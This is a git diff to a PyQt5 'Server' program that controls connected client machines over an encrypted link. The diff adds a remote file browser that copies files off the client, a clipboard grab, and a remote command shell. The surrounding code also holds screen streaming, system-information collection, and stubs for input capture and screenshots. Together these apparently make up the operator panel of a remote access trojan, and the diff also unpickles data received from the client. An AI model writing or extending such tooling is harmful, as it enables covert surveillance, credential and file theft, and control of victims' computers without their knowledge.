@@ -8,13 +8,17 @@ import time
 import numpy as np
 import json
 import uuid
+import os
+import threading
 from PyQt5.QtWidgets import QApplication
 from PyQt5.QtWidgets import (QLineEdit, QWidget, 
                              QPushButton, QToolTip, 
                              QLabel, QVBoxLayout, 
                              QMessageBox, QTextEdit,
                              QScrollBar, QDialog,
-                             QTableWidget, QTableWidgetItem, QHeaderView)
+                             QTableWidget, QTableWidgetItem, 
+                             QHeaderView, QFileDialog, QListWidget,
+                             QProgressBar)
 from PyQt5.QtGui import QFont, QIcon
 from PyQt5.QtCore import pyqtSignal, QObject, QThread, pyqtSlot
 from connection_module import SecureConnectionServer
@@ -56,7 +60,6 @@ class ScrollableTextInfo(QWidget):
         """)
         self.scroll_bar = QScrollBar()
         layout.addWidget(self.text_edit)
-        #layout.addWidget(self.scroll_bar)
         self.setLayout(layout)
         self.setGeometry(300, 300, 400, 300)
         self.setWindowTitle('Scrollable Text Info')
@@ -122,8 +125,9 @@ class CommandLineWindow(QDialog):
         try:
             command = self.input_line_edit.text()
             self.output_text_edit.append(command)
-            self.connection.send_data_AES(command)
+            self.connection.send_data_AES(command.encode("utf-8"))
             if command == "stop":
+                self.connection.send_data_AES(b"exit")
                 self.close()
                 return
             output = self.connection.receive_data_AES().decode("utf-8")
@@ -293,14 +297,171 @@ class ClientMonitorWindow(QWidget):
         self.popup.set_text(full_system_info)
         self.popup.show()
 
+class FileCopyWorker(QObject):
+    progress_updated = pyqtSignal(int)
+    speed_updated = pyqtSignal(float)
+    finished = pyqtSignal(str)
+
+    def __init__(self, connection, src_path, dest_path, mutex):
+        super().__init__()
+        self.connection = connection
+        self.src_path = src_path
+        self.dest_path = dest_path
+        self.mutex = mutex
+
+    def run(self):
+        try:
+            with self.mutex:
+                self.connection.send_data_AES(b"SND")
+                self.connection.send_data_AES(self.src_path.encode("utf-8"))
+
+                file_size = int(self.connection.receive_data_AES().decode("utf-8"))
+                received_size = 0
+                start_time = time.time()
+
+                with open(self.dest_path, "wb") as file:
+                    while True:
+                        data = self.connection.receive_data_AES()
+                        if data == b"EOF":
+                            break
+                        elif data.startswith(b"ERROR"):
+                            self.finished.emit(data.decode("utf-8"))
+                            return
+                        file.write(data)
+                        received_size += len(data)
+
+                        progress = (received_size / file_size) * 100
+                        self.progress_updated.emit(int(progress))
+
+                        elapsed_time = time.time() - start_time
+                        speed = (received_size / elapsed_time) / 1024 / 1024
+                        self.speed_updated.emit(speed)
+
+            self.finished.emit("File copy completed successfully.")
+        except Exception as e:
+            self.finished.emit(f"Error: {str(e)}")
+
+class FileBrowserWindow(QWidget):
+    def __init__(self, connection):
+        super().__init__()
+        self.connection = connection
+        self.current_path = "/"
+        self.mutex = threading.Lock() 
+        self.initUI()
+        self.list_directory(self.current_path)
+
+    def initUI(self):
+        layout = QVBoxLayout()
+
+        self.path_edit = QLineEdit(self)
+        self.path_edit.setText(self.current_path)
+        self.path_edit.returnPressed.connect(self.change_directory)
+
+        self.list_widget = QListWidget(self)
+        self.list_widget.itemDoubleClicked.connect(self.navigate)
+
+        self.copy_button = QPushButton("Copy", self)
+        self.copy_button.clicked.connect(self.copy_file)
+
+        self.progress_bar = QProgressBar(self)
+        self.progress_bar.setRange(0, 100)
+
+        self.speed_label = QLabel("Speed: 0 KB/s", self)
+
+        layout.addWidget(self.path_edit)
+        layout.addWidget(self.list_widget)
+        layout.addWidget(self.copy_button)
+        layout.addWidget(self.progress_bar)
+        layout.addWidget(self.speed_label)
+
+        self.setLayout(layout)
+        self.setWindowTitle("File Browser")
+        self.setGeometry(300, 300, 600, 400)
+
+    def list_directory(self, path):
+        try:
+            with self.mutex:
+                self.connection.send_data_AES(b"LSD")
+                self.connection.send_data_AES(path.encode("utf-8"))
+                data = self.connection.receive_data_AES()
+                if data.startswith(b"ERROR"):
+                    self.show_error_message(data.decode("utf-8"))
+                    return
+                files = pickle.loads(data)
+                self.list_widget.clear()
+                for file in files:
+                    self.list_widget.addItem(file)
+        except Exception as e:
+            self.show_error_message(f"Error: {str(e)}")
+
+    def change_directory(self):
+        self.current_path = self.path_edit.text()
+        self.list_directory(self.current_path)
+
+    def navigate(self, item):
+        path = os.path.join(self.current_path, item.text())
+        if os.path.isdir(path):
+            self.current_path = path
+            self.path_edit.setText(self.current_path)
+            self.list_directory(self.current_path)
+        else:
+            self.copy_file(path)
+
+    def copy_file(self, path=None):
+        if not path:
+            item = self.list_widget.currentItem()
+            if not item:
+                self.show_error_message("No file selected")
+                return
+            path = os.path.join(self.current_path, item.text())
+
+        save_path, _ = QFileDialog.getSaveFileName(self, "Save File As", item.text(), "All Files (*)")
+        if not save_path:
+            return
+
+        self.thread = QThread()
+        self.worker = FileCopyWorker(self.connection, path, save_path, self.mutex)
+        self.worker.moveToThread(self.thread)
+        self.worker.progress_updated.connect(self.update_progress_bar)
+        self.worker.speed_updated.connect(self.update_speed_label)
+        self.worker.finished.connect(self.on_copy_finished)
+        self.thread.started.connect(self.worker.run)
+        self.thread.start()
+
+    def update_speed_label(self, speed):
+        self.speed_label.setText(f"Speed: {speed:.2f} MB/s")
+
+    def update_progress_bar(self, value):
+        self.progress_bar.setValue(value)
+
+    def on_copy_finished(self, message):
+        self.thread.quit()
+        self.thread.wait()
+        QMessageBox.information(self, "File Copy Status", message)
+
+    def show_error_message(self, error_text):
+        error_box = QMessageBox()
+        error_box.setIcon(QMessageBox.Critical)
+        error_box.setText(error_text)
+        error_box.setWindowTitle("Error")
+        error_box.exec_()
+
 class Server(QWidget):
     def __init__(self, connection, os, ip):
         super().__init__()
         self.is_connected = True
         self.connection = connection
+        self.connected_ip = ip
         self.initUI()
         self.update_connection_status(os, ip)
-         
+    
+    def file_browser(self):
+        if not self.is_connected:
+            self.show_error_message("You are not connected to any client")
+            return
+        self.file_browser_window = FileBrowserWindow(self.connection)
+        self.file_browser_window.show()
+    
     def initUI(self):
         self.setWindowTitle('Server')
         self.setGeometry(300, 300, 500, 700)
@@ -371,11 +532,17 @@ class Server(QWidget):
         error_box.setWindowTitle("Error Message")
         error_box.exec_()
 
+    def remote_file_copy(self):
+        self.filebrowser = self.file_browser()
+
     def input_capture(self):
         pass
 
     def clipboard_data(self):
-        pass
+        self.connection.send_data_AES(b"CD")
+        clipboard_data_json_bytes = self.connection.receive_data_AES()
+        clipboard_data_json = clipboard_data_json_bytes.decode('utf-8')
+        self.show_info_popup(clipboard_data_json)
 
     def screenshot_capture(self):
         pass
@@ -384,17 +551,14 @@ class Server(QWidget):
         pass
 
     def gather_system_info(self):
-        if not self.is_connected:
-            self.show_error_message(f"You are not connected to any client")
-            return
         try:
-            self.connection.send_data_AES(b"1")
+            self.connection.send_data_AES(b"SI")
             date = str(datetime.now()).replace(":", "")
             system_info = self.connection.receive_data_AES().decode("utf-8")
             self.system_info_window = ScrollableTextInfo()
             self.system_info_window.set_text(system_info)
             self.system_info_window.show()
-            with open("sys_info" + date + ":" + self.connected_ip[0] + ".txt", "w+") as file:
+            with open("sys_info" + date + ":" + self.connected_ip + ".txt", "w+") as file:
                 file.write(system_info)
         except Exception as e:
             self.show_error_message(f"{str(e)}")
@@ -404,24 +568,10 @@ class Server(QWidget):
             self.show_error_message(f"You are not connected to any client")
             return
         try:
-            self.connection.send_data_AES(b"2")
+            self.connection.send_data_AES(b"CMD")
             self.command_line_window = CommandLineWindow()
             self.command_line_window.connection = self.connection
             self.command_line_window.exec_()
-        except Exception as e:
-            self.show_error_message(f"{str(e)}")
-
-    def remote_file_copy(self):
-        if not self.is_connected:
-            self.show_error_message(f"You are not connected to any client")
-            return
-        try:
-            self.connection.send(b"4")
-            filename = self.text_box.text()
-            self.connection.send_data_AES(filename)
-            with open(filename.split("/")[-1], "w") as file:
-                data = self.connection.receive_data_AES()
-                file.write(data)
         except Exception as e:
             self.show_error_message(f"{str(e)}")
 
@@ -458,7 +608,7 @@ class Server(QWidget):
             self.show_error_message("You are not connected to any client.")
             return
         try:
-            self.connection.send_data_AES(b"C")
+            self.connection.send_data_AES(b"SC")
             cv2.namedWindow('Screen Video', cv2.WINDOW_NORMAL)
             cv2.resizeWindow('Screen Video', 1280, 720)
 
@@ -490,12 +640,17 @@ class Server(QWidget):
             self.show_error_message(str(e))
             raise e
 
+    def show_info_popup(self, info):
+        self.popup = ScrollableTextInfo()
+        self.popup.set_text(info)
+        self.popup.show()
+
     def stop(self):
         if not self.is_connected:
             self.show_error_message(f"You are not connected to any client")
             return
         try:
-            self.connection.send(b"S")
+            self.connection.send(b"exit")
         except Exception as e:
             self.show_error_message(f"{str(e)}")       
 
